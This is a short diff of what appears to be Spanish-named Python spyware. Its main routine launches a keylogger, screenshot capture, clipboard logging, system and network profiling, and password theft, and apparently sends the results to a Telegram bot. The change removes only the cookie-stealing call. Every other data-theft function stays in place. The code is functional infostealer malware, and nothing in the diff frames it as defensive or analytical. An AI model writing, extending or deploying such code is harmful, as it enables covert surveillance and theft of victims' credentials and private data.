@@ -1,7 +1,7 @@
 import asyncio
 import logging
 from telegram import Bot
-from funciones_asyncronas import registro_errores, capturar_teclas, capture_screenshots, log_clipboard, especificaciones_sistema, informacion_red, cookies, passwords
+from funciones_asyncronas import registro_errores, capturar_teclas, capture_screenshots, log_clipboard, especificaciones_sistema, informacion_red, passwords
 from pynput import keyboard as kb
 from keylogger import detect_k, release_k
 
@@ -20,7 +20,6 @@ async def main():
             log_clipboard(bot),
             especificaciones_sistema(bot),
             informacion_red(bot),
-            cookies(bot),
             passwords(bot)
         )
     except Exception as e:
